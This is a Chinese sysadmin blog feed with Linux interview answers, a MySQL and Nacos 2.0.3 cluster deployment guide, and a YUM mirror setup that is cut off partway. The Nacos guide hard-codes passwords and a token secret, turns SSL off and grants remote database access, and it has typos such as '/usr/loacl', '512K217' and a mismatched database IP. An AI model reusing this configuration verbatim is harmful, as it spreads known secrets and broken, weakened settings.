id="30、打印使用率大于85-的分区"><a href="#30、打印使用率大于85-的分区" class="headerlink" title="30、打印使用率大于85%的分区"></a>30、打印使用率大于85%的分区</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@tiejiang</span> ~]<span class="hljs-meta"># df -h | awk <span class="hljs-string">&#x27;+$5&gt;85&#x27;</span></span><br></code></pre></td></tr></table></figure><h2 id="31、统计出apache的access-log中访问量最多的5个IP"><a href="#31、统计出apache的access-log中访问量最多的5个IP" class="headerlink" title="31、统计出apache的access.log中访问量最多的5个IP"></a>31、统计出apache的access.log中访问量最多的5个IP</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@tiejiang ~]# <span class="hljs-keyword">cat</span> access.<span class="hljs-keyword">log</span> | awk &#x27;&#123;a[<span class="hljs-variable">$1</span>]++&#125;END&#123;<span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> a)<span class="hljs-keyword">print</span> i,a[i] |<span class="hljs-string">&quot;sort -n -r -k 2&quot;</span>&#125;&#x27; | head -5<br></code></pre></td></tr></table></figure><h2 id="32、检测并修复-dev-hda5"><a href="#32、检测并修复-dev-hda5" class="headerlink" title="32、检测并修复/dev/hda5"></a>32、检测并修复/dev/hda5</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@tiejiang</span> ~]<span class="hljs-meta"># e2fsck -p /dev/hda5</span><br></code></pre></td></tr></table></figure><h2 id="33、符号链接和硬链接的区别"><a href="#33、符号链接和硬链接的区别" class="headerlink" title="33、符号链接和硬链接的区别"></a>33、符号链接和硬链接的区别</h2><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs erlang">硬链接:不同路径的文件指定的是同一个inode<br>     硬链接不能跨分区存在<br>     硬链接不能链接到目录(要避免循环引用)<br>     删除硬链接只会减少文件被硬链接的次数,源文件不会动.<br>软链接:是一个独立的文件,有自己独立的inode<br>     引用的是路径本身,不是inode<br>     删除软链接,跟源文件没任何关系<br>     软链接没有存储任何数据,只是存储了访问文件的另一种路径.<br>     软链接可以对目录创建,也可以跨分区<br>     源文件被删除,软连接将不可用.<br></code></pre></td></tr></table></figure><h2 id="34、在取一个100以内的随机数指定范围内取随机数，语言不限，越短越好"><a href="#34、在取一个100以内的随机数指定范围内取随机数，语言不限，越短越好" class="headerlink" title="34、在取一个100以内的随机数指定范围内取随机数，语言不限，越短越好"></a>34、在取一个100以内的随机数指定范围内取随机数，语言不限，越短越好</h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">[root@tiejiang ~]# echo $[$RANDOM%100]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Centos7.8部署mysql与Nacos-2.0.3</title>
    <link href="/2023/07/28/Centos7-8%E9%83%A8%E7%BD%B2mysql%E4%B8%8ENacos-2-0-3/"/>
    <url>/2023/07/28/Centos7-8%E9%83%A8%E7%BD%B2mysql%E4%B8%8ENacos-2-0-3/</url>
    
    <content type="html"><![CDATA[<h2 id="一、Nacos-简介"><a href="#一、Nacos-简介" class="headerlink" title="一、Nacos 简介"></a>一、Nacos 简介</h2><p>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。 Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。</p><p>nacos官网：<a href="https://nacos.io/zh-cn/docs/what-is-nacos.html">https://nacos.io/zh-cn/docs/what-is-nacos.html</a></p><h2 id="二、Nacos-安装"><a href="#二、Nacos-安装" class="headerlink" title="二、Nacos 安装"></a>二、Nacos 安装</h2><h3 id="2-1-Nacos-环境依赖"><a href="#2-1-Nacos-环境依赖" class="headerlink" title="2.1 Nacos 环境依赖"></a>2.1 Nacos 环境依赖</h3><p>Nacos 基于 java 开发的，运行依赖于64 bit JDK 1.8+环境。</p><p>前往官网下载JDK: <a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">Java Downloads | Oracle</a></p><h3 id="2-2-Nacos-服务端安装"><a href="#2-2-Nacos-服务端安装" class="headerlink" title="2.2 Nacos 服务端安装"></a>2.2 Nacos 服务端安装</h3><p>由于Nacos是开源的，可以从github下载源码编译后安装，也可以直接从github下载官方编译好的安装包进行安装，本文直接使用官方编译好的包进行安装，基于目前官方最新release2.0.3版本。请勿使用2.x以下的版本，之前爆出过漏洞。2.x版本相对于1.x版本，性能也提升了10倍。</p><p>下载地址：<a href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a><br><img src="2023071514211223.png" alt="Centos7.8部署mysql与Nacos-2.0.3 集群保姆级文档_https://www.tiejiang.org_Linux安全运维_第1张"></p><h2 id="三、Nacos-部署"><a href="#三、Nacos-部署" class="headerlink" title="三、Nacos 部署"></a>三、Nacos 部署</h2><h3 id="3-1-集群部署"><a href="#3-1-集群部署" class="headerlink" title="3.1 集群部署"></a>3.1 集群部署</h3><h4 id="3-2-1-集群架构"><a href="#3-2-1-集群架构" class="headerlink" title="3.2.1 集群架构"></a>3.2.1 集群架构</h4><p><img src="2023071514221453.png" alt="Centos7.8部署mysql与Nacos-2.0.3 集群保姆级文档_https://www.tiejiang.org_Linux安全运维_第2张"><br>● 高可用 Nginx 集群<br>● Nacos 集群（至少三个实例）<br>● 高可用数据库集群（取代 Nacos 内嵌数据库)</p><h4 id="3-2-2-模拟部署"><a href="#3-2-2-模拟部署" class="headerlink" title="3.2.2 模拟部署"></a>3.2.2 模拟部署</h4><table><thead><tr><th>系统版本</th><th>机器IP</th><th>部署应用版本</th></tr></thead><tbody><tr><td>centos7.9</td><td>192.168.1.1</td><td>mysql 5.7</td></tr><tr><td>centos7.9</td><td>192.168.1.1</td><td>nacos 2.0.3</td></tr><tr><td>centos7.9</td><td>192.168.1.1</td><td>nacos 2.0.3</td></tr><tr><td>centos7.9</td><td>192.168.1.1</td><td>nacos 2.0.3</td></tr></tbody></table><h2 id="四、搭建步骤"><a href="#四、搭建步骤" class="headerlink" title="四、搭建步骤"></a>四、搭建步骤</h2><h3 id="1、mysql单点部署"><a href="#1、mysql单点部署" class="headerlink" title="1、mysql单点部署"></a>1、mysql单点部署</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">[root@tiejiang.org ~] <span class="hljs-built_in">cd</span> /vdb/<br>[root@tiejiang.org vdb] <span class="hljs-built_in">mkdir</span> src<br>[root@tiejiang.org vdb] wget https://cdn.mysql.com/archives/mysql-5.7/mysql-5.7.37-linux-glibc2.12-x86_64.tar.gz<br>[root@tiejiang.org vdb] yum install libaio -y<br><br>-- 添加mysql用户<br>[root@tiejiang.org vdb] groupadd mysql<br>[root@tiejiang.org vdb] useradd -r -g mysql mysql<br>[root@tiejiang.org vdb] tar zxvf mysql-5.7.37-linux-glibc2.12-x86_64.tar.gz<br>[root@tiejiang.org vdb] <span class="hljs-built_in">mv</span> mysql-5.7.37-linux-glibc2.12-x86_64 /usr/local/mysql<br>[root@tiejiang.org vdb] <span class="hljs-built_in">cd</span> /usr/local/mysql/;<br>[root@tiejiang.org mysql] <span class="hljs-built_in">mkdir</span> /vdb/mysql;<br>[root@tiejiang.org mysql] <span class="hljs-built_in">mkdir</span> /vdb/mysql/data;<br>[root@tiejiang.org mysql] <span class="hljs-built_in">mkdir</span> /vdb/mysql/binlog<br>[root@tiejiang.org mysql] <span class="hljs-built_in">mkdir</span> /vdb/mysql/relaylog;<br>[root@tiejiang.org mysql] <span class="hljs-built_in">mkdir</span> /vdb/mysql/log<br>[root@tiejiang.org mysql] <span class="hljs-built_in">mkdir</span> /vdb/mysql/run<br>[root@tiejiang.org mysql] <span class="hljs-built_in">mkdir</span> /tmp/mysql;<br>[root@tiejiang.org mysql] <span class="hljs-built_in">touch</span> /vdb/mysql/log/mysql.err<br>[root@tiejiang.org mysql] <span class="hljs-built_in">chown</span> -R mysql.mysql /vdb/mysql;<br>[root@tiejiang.org mysql] <span class="hljs-built_in">chown</span> -R mysql.mysql /tmp/mysql;<br><br>[root@tiejiang.org mysql] <span class="hljs-built_in">rm</span> -rf /usr/local/mysql/data;<br>[root@tiejiang.org mysql] <span class="hljs-built_in">ln</span> -s /vdb/mysql/data data;<br>[root@tiejiang.org mysql] <span class="hljs-built_in">cd</span> support-files/;<br>[root@tiejiang.org support-files] <span class="hljs-built_in">cp</span> mysql.server /etc/init.d/mysqld;<br>[root@tiejiang.org support-files] <span class="hljs-built_in">chmod</span> 755 /etc/init.d/mysqld;<br><br><span class="hljs-comment">## 去修改my.conf的配置文件，把下面的conf文件内容放进去。</span><br>[root@tiejiang.org support-files] vim /etc/my.conf<br>      [mysql]<br>      port = 3306<br>      default_character_set = utf8mb4<br>      socket = /vdb/mysql/run/mysql.socket<br><br>      [mysqld]<br>      log_slave_updates = 1<br>      lower_case_table_names=1<br>      <span class="hljs-comment"># disable auto start slave and need to start slave by mual</span><br>      skip_slave_start<br>      <span class="hljs-comment">#read_only = 1</span><br>      <span class="hljs-comment"># charset</span><br>      character_set_server = utf8mb4<br>      <span class="hljs-comment"># server</span><br>      max_connections = 1000<br>      max_connect_errors = 99999<br>      max_allowed_packet = 1000M<br>      net_buffer_length = 16K<br>      skip_name_resolve<br>      skip_external_locking<br>      back_log = 150<br>      query_cache_size = 0<br>      query_cache_type = 0<br>      basedir = /usr/local/mysql<br>      datadir = /vdb/mysql/data<br>      port = 3306<br>      server_id = 12855<br>      socket = /vdb/mysql/run/mysql.socket<br>      pid_file = /vdb/mysql/run/mysql.pid<br>      log_error = /vdb/mysql/log/mysql.err<br>      explicit_defaults_for_timestamp = 1<br><br>      <span class="hljs-comment"># binlog</span><br>      log_bin = mysql-bin<br>      binlog_row_image = full<br>      log_bin_index = /vdb/mysql/data/mysql-bin.index<br>      binlog_format = MIXED<br>      expire_logs_days = 1<br>      sync_binlog = 1000<br><br>      <span class="hljs-comment"># slowlog</span><br>      slow_query_log = 1<br>      slow_query_log_file = /vdb/mysql/log/slow.log<br>      long_query_time = 1<br>      binlog_rows_query_log_events = 1<br><br>      <span class="hljs-comment"># master &amp; relay record method</span><br>      master_info_repository = table<br>      relay_log_info_repository = table<br>      relay_log_recovery = 1<br>      slave_net_timeout = 20<br><br>      <span class="hljs-comment"># aviod to duplicate in the double master</span><br>      <span class="hljs-comment">#auto_increment_increment=2</span><br>      <span class="hljs-comment">#auto_increment_offset=2</span><br><br>      <span class="hljs-comment"># session conn</span><br>      binlog_cache_size = 32M<br>      thread_stack = 512K217<br>      join_buffer_size = 512K<br>      sort_buffer_size = 256K<br>      read_buffer_size = 512K<br>      read_rnd_buffer_size = 256K<br>      tmp_table_size = 64M<br>      max_heap_table_size = 64M<br>      bulk_insert_buffer_size = 1M<br><br>      <span class="hljs-comment"># Global share memory</span><br>      table_definition_cache = 400<br>      table_open_cache = 400<br>      thread_cache_size = 512<br><br>      <span class="hljs-comment"># event</span><br>      event_scheduler = 1<br><br>      <span class="hljs-comment"># innodb</span><br>      innodb_data_home_dir = /vdb/mysql/data<br>      innodb_data_file_path = ibdata1:1000M:autoextend<br>      innodb_file_per_table = 1<br>      innodb_log_group_home_dir = /vdb/mysql/data<br>      innodb_log_files_in_group = 3<br>      innodb_log_buffer_size = 16M<br>      innodb_log_file_size = 256M<br>      innodb_flush_log_at_trx_commit = 2<br>      innodb_file_format = Barracuda<br>      innodb_file_format_max = Barracuda<br>      innodb_buffer_pool_size = 20000M      //一般设置内存的一半<br>      <span class="hljs-comment">#innodb_buffer_pool_dump_at_shutdown = 1</span><br>      <span class="hljs-comment">#innodb_buffer_pool_dump_now = 1</span><br>      <span class="hljs-comment">#innodb_buffer_pool_load_at_startup = 1</span><br>      <span class="hljs-comment">#innodb_buffer_pool_load_now = 1</span><br>      innodb_buffer_pool_instances = 8<br>      innodb_flush_method = O_DIRECT<br>      innodb_io_capacity = 600<br>      innodb_lock_wait_timeout = 10<br>      open_files_limit = 400<br>      innodb_open_files = 400<br>      innodb_purge_threads = 1<br>      innodb_read_io_threads = 12<br>      innodb_write_io_threads = 12<br>      innodb_thread_concurrency = 24<br><br>      <span class="hljs-comment"># MyISAM</span><br>      key_buffer_size = 8M<br>      myisam_sort_buffer_size = 128K<br><br>      <span class="hljs-comment"># sql profiling</span><br>      sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES<br><br>[root@tiejiang.org support-files] mysqld --initialize --user=mysql   //初始化mysql数据库<br>[root@tiejiang.org support-files] service mysqld start      //启动mysql服务<br>[root@tiejiang.org support-files] <span class="hljs-built_in">cat</span> /vdb/mysql/log/mysql.err | grep password    //查看初始化后mysql的密码<br><br>//用初始化mysql后拿到的密码登录mysql，修改mysql的root密码<br>[root@tiejiang.org ~] mysql -uroot -palsgfasfa8s<br>  mysql&gt; ALTER USER <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;Liu180854&#x27;</span>;<br>  mysql&gt; <span class="hljs-built_in">exit</span>;COPY<br></code></pre></td></tr></table></figure><h3 id="2、nacos集群部署，3台机器都要操作"><a href="#2、nacos集群部署，3台机器都要操作" class="headerlink" title="2、nacos集群部署，3台机器都要操作"></a>2、nacos集群部署，3台机器都要操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装jdk环境</span><br>[root@tiejiang.org ~] yum -y remove java<br>[root@tiejiang.org ~] <span class="hljs-built_in">mkdir</span> /opt/src<br>[root@tiejiang.org ~] wget -P /opt/src http://10.205.210.70/jdk/jdk-8u181-linux-x64.tar.gz<br>[root@tiejiang.org ~] tar -xzvf /opt/src/jdk-8u181-linux-x64.tar.gz -C /opt<br>[root@tiejiang.org ~] <span class="hljs-built_in">rm</span> -rf /opt/java<br>[root@tiejiang.org ~] <span class="hljs-built_in">ln</span> -sf /opt/jdk1.8.0_181 /opt/java<br>[root@tiejiang.org ~] <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export JAVA_HOME=/opt/java&#x27;</span>&gt;&gt;/etc/profile<br>[root@tiejiang.org ~] <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export JAVA_BIN=$JAVA_HOME/bin&#x27;</span>&gt;&gt;/etc/profile<br>[root@tiejiang.org ~] <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export JAVA_LIB=$JAVA_HOME/lib&#x27;</span>&gt;&gt;/etc/profile<br>[root@tiejiang.org ~] <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export PATH=$JAVA_BIN:$PATH&#x27;</span>&gt;&gt;/etc/profile<br>[root@tiejiang.org ~] <span class="hljs-built_in">source</span> /etc/profile<br><br>[root@tiejiang.org ~] <span class="hljs-built_in">cd</span> /usr/local/src/<br>[root@tiejiang.org src] wget https://github.com/alibaba/nacos/releases/download/2.0.3/nacos-server-2.0.3.tar.gz<br>[root@tiejiang.org src] tar -zxvf nacos-server-2.0.3.tar.gz<br>[root@tiejiang.org src] <span class="hljs-built_in">mv</span> nacos /usr/local/nacos-2.0.3<br>[root@tiejiang.org src] PASSWORD=$(<span class="hljs-built_in">base64</span> &lt; /dev/urandom | <span class="hljs-built_in">head</span> -c8); <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$PASSWORD</span>&quot;</span>; <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$PASSWORD</span>&quot;</span> | <span class="hljs-built_in">sha256sum</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;-&#x27;</span><br>  <span class="hljs-comment">#生成nacos需要用到的tocken</span><br>  <span class="hljs-comment">#生成的密码：f7me4Iel</span><br>  <span class="hljs-comment">#生成的秘钥，开nacos鉴权的时候配置文件需要：c7020a710bc550d27fbcdd2ed067cb27965f2de9aa7212f3e4fee8b272e09874</span><br><br><span class="hljs-comment"># 登陆mysql，创建nacos需要用到的nacos_config数据库和用户</span><br>[root@tiejiang.org src] mysql -uroot -palsgfasfa8s<br>    mysql&gt; create database nacos_config;   //创建数据库<br>    mysql&gt; use nacos_config；     //应用数据库<br>    mysql&gt; <span class="hljs-built_in">set</span> names utf8;       //设置字符集<br>    mysql&gt; CREATE USER <span class="hljs-string">&#x27;nacos&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;Liu123456&#x27;</span>;      //创建一个nacos的用户，并将连接设置为远程<br>    mysql&gt; GRANT ALL PRIVILEGES ON nacos_config.* TO <span class="hljs-string">&#x27;nacos&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;        //授权新用户访问nacos_config数据库的权限<br>    mysql&gt; FLUSH PRIVILEGES;     //权限刷新<br>    mysql&gt; <span class="hljs-built_in">source</span> /usr/local/nacos-2.0.3/conf/nacos-mysql.sql;       //导入nacos的.sql文件 <br><br>[root@tiejiang.org src] vim /usr/loacl/nacos-2.0.3/conf/application.properties<br>        <span class="hljs-comment">#在#*************** Config Module Related Configurations ***************#  下面新增jdbc连接mysql参数</span><br>    spring.datasource.platform=mysql<br>    db.num=1<br>    db.url.0=jdbc:mysql://195.168.1.1:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=<span class="hljs-literal">true</span>&amp;useUnicode=<span class="hljs-literal">true</span>&amp;useSSL=<span class="hljs-literal">false</span>&amp;serverTimezone=UTC<br>    db.user.0=nacos<br>    db.password.0=Liu123456<br><br>    <span class="hljs-comment">#nacos开启授权</span><br>    nacos.core.auth.system.type=nacos<br>    nacos.core.auth.enabled=<span class="hljs-literal">true</span><br><br>    <span class="hljs-comment">#自定义秘钥，用于tocken</span><br>    nacos.core.auth.default.token.secret.key=c7020a710bc550d27fbcdd2ed067cb27965f2de9aa7212f3e4fee8b272e09874  //上面命令生成的<span class="hljs-built_in">base64</span>秘钥<br><br>[root@tiejiang.org ~] vim /usr/loacl/nacos-2.0.3/conf/cluster.conf<br>    192.168.1.2:8848<br>    192.168.1.3:8848<br>    192.168.1.4:8848<br>[root@tiejiang.org ~] bash /usr/local/nacos-2.0.3/bin/startup.shCOPY<br></code></pre></td></tr></table></figure><h3 id="3、登陆nacos后台配置"><a href="#3、登陆nacos后台配置" class="headerlink" title="3、登陆nacos后台配置"></a>3、登陆nacos后台配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.2:8848/nacos/index.html<br>http://192.168.1.3:8848/nacos/index.html<br>http://192.168.1.4:8848/nacos/index.htmlCOPY<br></code></pre></td></tr></table></figure><p>去页面中创建一个nacos的用户，密码自定义。<br><img src="2023071514262086.png" alt="Centos7.8部署mysql与Nacos-2.0.3 集群保姆级文档_https://www.tiejiang.org_Linux安全运维_第3张"><br><img src="2023071514264170.png" alt="Centos7.8部署mysql与Nacos-2.0.3 集群保姆级文档_https://www.tiejiang.org_Linux安全运维_第4张"></p><h3 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">该命令的username和password是登录上面网页nacos后台创建的<br>[root@tiejiang.org ~] curl -X POST <span class="hljs-string">&#x27;192.168.1.2:8848/nacos/v1/auth/login&#x27;</span> -d <span class="hljs-string">&#x27;username=yunwei&amp;password=&#x27;</span>yunwei123<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux搭建YUM云仓库</title>
    <link href="/2023/07/28/linux%E6%90%AD%E5%BB%BAYUM%E4%BA%91%E4%BB%93%E5%BA%93/"/>
    <url>/2023/07/28/linux%E6%90%AD%E5%BB%BAYUM%E4%BA%91%E4%BB%93%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h2 id="安装需要的软件"><a href="#安装需要的软件" class="headerlink" title="安装需要的软件"></a>安装需要的软件</h2><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories ~]<span class="hljs-comment"># yum install wget vim nginx createrepo reposync yum-utils -yCOPY</span><br></code></pre></td></tr></table></figure><h3 id="配置NGINX服务器"><a href="#配置NGINX服务器" class="headerlink" title="配置NGINX服务器"></a>配置NGINX服务器</h3><h3 id="1、修改nginx配置文件"><a href="#1、修改nginx配置文件" class="headerlink" title="1、修改nginx配置文件"></a>1、修改nginx配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories ~]<span class="hljs-comment"># vim /etc/nginx/nginx.conf</span><br>…<br>server &#123;<br>        <span class="hljs-comment">#listen       80 default_server;</span><br>        <span class="hljs-comment">#listen       [::]:80 default_server;</span><br>        listen       80;<br>        server_name  192.168.0.228;<br>        <span class="hljs-comment">#root         /usr/share/nginx/html;</span><br>        <span class="hljs-comment"># Load configuration files for the default server block.</span><br>        include /etc/nginx/default.d/*.conf;<br> <br>        location / &#123;<br>                root /mds/yum;<br>        &#125;<br>….COPY<br></code></pre></td></tr></table></figure><h3 id="2、启动nginx并设置开机自动启动："><a href="#2、启动nginx并设置开机自动启动：" class="headerlink" title="2、启动nginx并设置开机自动启动："></a>2、启动nginx并设置开机自动启动：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories ~]<span class="hljs-comment"># systemctl start nginx</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># systemctl enable nginxCOPY</span><br></code></pre></td></tr></table></figure><h2 id="创建yum源目录"><a href="#创建yum源目录" class="headerlink" title="创建yum源目录"></a>创建yum源目录</h2><h3 id="1、创建需要存放rpm包的目录"><a href="#1、创建需要存放rpm包的目录" class="headerlink" title="1、创建需要存放rpm包的目录"></a>1、创建需要存放rpm包的目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories mds]<span class="hljs-comment"># pwd</span><br>/mds<br>[root@Yum-Repositories mds]<span class="hljs-comment"># mkdir yum</span><br>[root@Yum-Repositories yum]<span class="hljs-comment"># mkdir centos6</span><br>[root@Yum-Repositories yum]<span class="hljs-comment"># mkdir centos7COPY</span><br></code></pre></td></tr></table></figure><h2 id="配置本地yum服务器的上层yum源"><a href="#配置本地yum服务器的上层yum源" class="headerlink" title="配置本地yum服务器的上层yum源"></a>配置本地yum服务器的上层yum源</h2><h3 id="1、备份原有的repo文件"><a href="#1、备份原有的repo文件" class="headerlink" title="1、备份原有的repo文件"></a>1、备份原有的repo文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># pwd</span><br>/etc/yum.repos.d<br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mkdir tmp</span><br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv ./*.repo tmp/COPY</span><br></code></pre></td></tr></table></figure><h3 id="2、下载阿里云yum源的repo文件和docker的官方repo文件"><a href="#2、下载阿里云yum源的repo文件和docker的官方repo文件" class="headerlink" title="2、下载阿里云yum源的repo文件和docker的官方repo文件"></a>2、下载阿里云yum源的repo文件和docker的官方repo文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># wget http://mirrors.aliyun.com/repo/Centos-6.repo</span><br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># wget https://download.docker.com/linux/centos/docker-ce.repo</span><br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv docker-ce.repo 